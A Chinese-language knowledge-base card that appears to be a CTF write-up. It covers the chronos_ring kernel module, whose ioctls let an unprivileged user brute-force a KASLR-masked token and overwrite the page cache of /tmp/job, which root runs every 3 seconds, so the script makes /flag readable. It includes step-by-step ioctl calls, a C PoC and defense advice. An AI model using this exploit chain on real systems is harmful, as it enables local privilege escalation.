---
id: binary-pwn-kernel-chronos-ring-view-page-cache-job-root-helper
title: 内核模块 chronos_ring 的 view 原语改写 /tmp/job page cache：root 定时任务执行脚本提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-view-memcpy-set-page-dirty-root-helper
tags:
- kernel
- pwn
- linux-kernel
- page-cache
- ioctl
- set_page_dirty
- pin-user-pages
- read-cache-page
- root-helper
- local-privilege-escalation
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V159
  verified_at: '2026-11-06T07:38:54+08:00'
  notes: 已对照原文核对：init加载chronos_ring.ko、/dev/chronos_ring 666、root每3秒执行/tmp/job、ioctl 0x1001-0x100a语义、0x1002鉴权公式与kfree掩码爆破、0x1004 read_cache_page绑文件页、0x1005需flags&2、0x1008 memcpy+set_page_dirty、白名单仅job、payload chmod 644 /flag及完整C exp均与原文一致。未验证点：PoC未在本机复跑；原文只给靶场模块与内核环境，未给受影响版本区间，未设置versions；原文未提供sources/source_url。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-chronos-ring-view-page-cache-job-root-helper/
draft: false
kb_aliases:
- SU_Chronos_Ring
- chronos_ring
- page cache 写原语
- set_page_dirty 提权
- read_cache_page view
- root helper /tmp/job
- kfree 地址掩码爆破鉴权
---

## 一句话结论

一个普通用户可打开的内核字符设备把“pin 用户页 + 附加文件页 + 创建 view + 把 ring buffer memcpy 到 view + `set_page_dirty`”组合成对指定文件 page cache 的写原语；由于 root 每 3 秒执行一次 `/tmp/job`，攻击者只需把该脚本的页缓存改成 `chmod 644 /flag`，就能借 root helper 提升权限并读取 flag，而磁盘上的文件内容保持不变。

## 原理

- **靶场初始化**：`init` 加载 `chronos_ring.ko`，把 `/dev/chronos_ring` 权限设为 666，并启动一个 root 循环，每 3 秒执行 `/bin/sh /tmp/job`（输出丢弃）。`/tmp/job` 初始内容是无害的 `echo`，权限 644；`/flag` 普通用户不可读。攻击目标因此不是写 `/flag`，而是改 `/tmp/job`，让 root 帮忙放开 `/flag`。
- **ioctl 接口语义**：`0x1001` 创建 0x1000 大小的 ring buffer；`0x1002` 鉴权；`0x1003` 用 `pin_user_pages_fast` 固定一个用户页；`0x1004` 对传入 fd 做 `fget` + `read_cache_page`，把文件页缓存挂到 buffer；`0x1005` 为 buffer 创建 view；`0x1007` 把用户数据 memcpy 进 ring buffer；`0x1008` 把 ring buffer 内容 memcpy 到 view 指向的地址，并在 `view->kind == 2`（file-backed page）时调用 `set_page_dirty`；`0x1009` 读状态；`0x100a` 销毁。
- **危险组合而不是单个 ioctl**：单独看每个接口都合法——pin 用户页是常见做法，`read_cache_page` 只是读文件页，view 是内部对象，`set_page_dirty` 是文件系统正常操作。但 `0x1004` 把文件页缓存页挂成 view，`0x1008` 又允许把攻击者控制的 buffer 写进这个 view，并标记为脏；于是攻击者无需以写方式打开文件，就能修改该文件在所有读者眼中的内存副本。page cache 是全局共享的，root 的 `/bin/sh /tmp/job` 读取到的正是被改写的页，因此脚本内容被替换。
- **目标收敛**：驱动对可绑定的文件名做校验，实际只允许 `job`。这意味着设计者明确把 `/tmp/job` 作为唯一入口；`/flag` 不允许直接绑定，root helper 才是权限放大器。攻击链是“改 root 要执行的脚本”，不是“直接提权到 root”。
- **鉴权为什么可爆破**：校验式为 `(seed ^ key ^ ((kfree >> 4) & 0xfffffffffffe0000)) == 0xf372fe94f82b3c6e`。`kfree` 是内核 text 符号，KASLR 只移动其高位，且掩码把 `kfree >> 4` 的低 17 位清零，等价于清掉 `kfree` 的低 21 位；内核 text 基址按 2MB 对齐，未知量只剩少量候选。攻击者令 `seed=0`，枚举 `key = const ^ ((0xffffffff81000000 >> 4) + i * (0x200000 >> 4))`（即原文的 `0x0ffffffff8100000 + i * 0x20000`），最多 0x2000 次即可命中。这里没有密钥，只有被截断的内核地址；看起来像“地址鉴权”，实际熵很低。
- **pin 用户页不是冗余步骤**：`0x1003` 成功后设置 `ctx->flags` 的 bit 1；`0x1005` 创建 view 前检查 `(ctx->flags & 2) != 0`，因此必须先 pin 一个用户页才能进入 view 创建路径。它是整条链的使能条件。
- **页缓存与磁盘的关系**：`set_page_dirty` 让内核把该页视为已修改；root 执行脚本时读的是页缓存，所以立即生效。之后页回写可能把内容落到磁盘，反而会留下痕迹；攻击者通常只需在回写前完成读取 `/flag`。

## 触发条件

- `/dev/chronos_ring` 对普通用户可读写（靶场为 666），或攻击者能打开该设备。
- root 会周期性执行一个普通用户可写路径下的脚本（此处 `/tmp/job`，每 3 秒一次）。
- 驱动的文件白名单允许绑定该脚本文件（此处只允许 `job`），且文件存在、可读。
- 攻击者知道 ioctl 编号和结构体布局；鉴权常量与内核 text 基址范围已知（或可通过爆破覆盖）。
- 目标内核允许 `pin_user_pages_fast`、`read_cache_page` 和 `set_page_dirty` 的这些用法（靶场模块自身实现）。

## 利用步骤

1. `open("/dev/chronos_ring", O_RDWR)`。
2. `ioctl(fd, 0x1001, 0)` 创建 0x1000 ring buffer。
3. 爆破 `0x1002`：`req.key = 0xf372fe94f82b3c6e ^ ((0xffffffff81000000 >> 4) + i * (0x200000 >> 4))`，`req.seed = 0`，i 从 0 到 0x2000；返回 0 即通过。
4. `ioctl(fd, 0x1007, &write_req{user_buf=payload, len=sizeof(payload)-1, off=0})` 把 shell 脚本写进 ring buffer。payload 例如 `#!/bin/sh\nchmod 644 /flag\n#\n` 加注释填充，保证脚本合法且覆盖旧内容。
5. `ioctl(fd, 0x1003, &page_ptr)` pin 一个用户页，置位 `flags & 2`。
6. `open("/tmp/job", O_RDONLY)` 得到 fd；`ioctl(fd, 0x1004, &attach_req{fd=jobfd, index=0})` 绑定该文件第 0 页。
7. `ioctl(fd, 0x1005, 0)` 创建 file-backed view（kind=2）。
8. `ioctl(fd, 0x1008, &copy_req{len=sizeof(payload)-1, off=0})` 把 buffer 内容拷进 view 并 `set_page_dirty`，即改写 `/tmp/job` 的 page cache。
9. 等待最多数秒，让 root 循环执行被改写的 `/tmp/job`；脚本执行 `chmod 644 /flag`。
10. 普通用户 `open/read("/flag")`，输出 flag。

## PoC

原文给出完整静态链接 C 程序；下面为最小调用序列（结构体字段按原文顺序）：

```c
struct auth_req   { uint64_t key; uint32_t seed; uint32_t pad; };
struct write_req  { uint64_t user_buf; uint32_t len; uint32_t off; };
struct attach_req { int32_t fd; uint32_t index; };
struct copy_req   { uint64_t pad; uint32_t len; uint32_t off; };

static const char payload[] =
    "#!/bin/sh\n"
    "chmod 644 /flag\n"
    "#\n"
    "################################";

int fd = open("/dev/chronos_ring", O_RDWR);
ioctl(fd, 0x1001, 0);

for (uint64_t i = 0; i < 0x2000; i++) {
    struct auth_req a = {
        .key = 0xf372fe94f82b3c6eULL ^
               (0x0ffffffff8100000ULL + i * 0x20000ULL),
        .seed = 0, .pad = 0
    };
    if (ioctl(fd, 0x1002, &a) == 0) break;
}

struct write_req w = { (uint64_t)(uintptr_t)payload, sizeof(payload) - 1, 0 };
ioctl(fd, 0x1007, &w);

void *page = scratch;
ioctl(fd, 0x1003, &page);

int jobfd = open("/tmp/job", O_RDONLY);
struct attach_req at = { jobfd, 0 };
ioctl(fd, 0x1004, &at);
close(jobfd);

ioctl(fd, 0x1005, 0);

struct copy_req c = { 0, sizeof(payload) - 1, 0 };
ioctl(fd, 0x1008, &c);
close(fd);

sleep(4);
/* open/read/write "/flag" */
```

原文实测：写入后等待 root helper 执行，普通用户即可读到 `/flag`；PoC 未在本会话复跑。

## 变体与关联

- **改别的 root 可执行文件**：如果白名单允许其它文件，可改 setuid 二进制或 root 服务脚本的 page cache；本靶场把白名单收敛到 `job`，才需要借助 root helper。
- **直接改 `/flag`**：若驱动不限制文件名，`0x1004` 绑定 `/flag` 后 `0x1008` 直接改其页缓存即可，无需 root helper；但读取权限仍受文件 mode 限制，通常仍需配合 root 执行。
- **与真实内核漏洞对照**：[[binary-pwn-kernel-cve-2026-31431-page-cache-poisoning-lpe]] 用 AF_ALG/splice 的越界写污染 setuid 页缓存；[[binary-pwn-kernel-splice-external-page-crc-commit-page-cache-write]] 用模块 splice external page + CRC commit 做 4 字节 page cache 写。本卡不是内核 bug，而是自定义驱动主动暴露的 page cache 写原语，靠“root 执行可写脚本”放大。
- **鉴权爆破**：同类“地址掩码 + 常量异或”的 token 校验都可先判断熵：如果只保留对齐后的高位，枚举 KASLR 窗口通常远小于 2^32。

## 检测与防御

- **设备权限**：`/dev/chronos_ring` 不应设为 666；只允许可信服务打开，使用 SELinux/AppArmor 限制 ioctl。
- **接口设计**：不要把“pin 用户页 + 附加任意文件页 + memcpy + set_page_dirty”暴露给非特权用户；如果必须提供，至少限制可绑定文件为只读、非可执行、非 root 执行路径。
- **root helper**：不要周期性执行普通用户可写的脚本；把脚本放在 root 拥有、普通用户不可写的目录，校验完整性，使用最小权限运行。
- **检测**：审计对同一文件的 page cache 写与随后 root 进程执行该文件的组合；监控 `set_page_dirty` 来自非文件系统路径的异常调用；检查 `/dev` 下世界可写字符设备与 root cron/loop 的交集。
- **内核加固**：模块签名、只加载可信模块；对自定义 ioctl 做权限检查（`capable(CAP_SYS_ADMIN)` 或文件属主校验），不要用低熵“地址 token”代替权限。
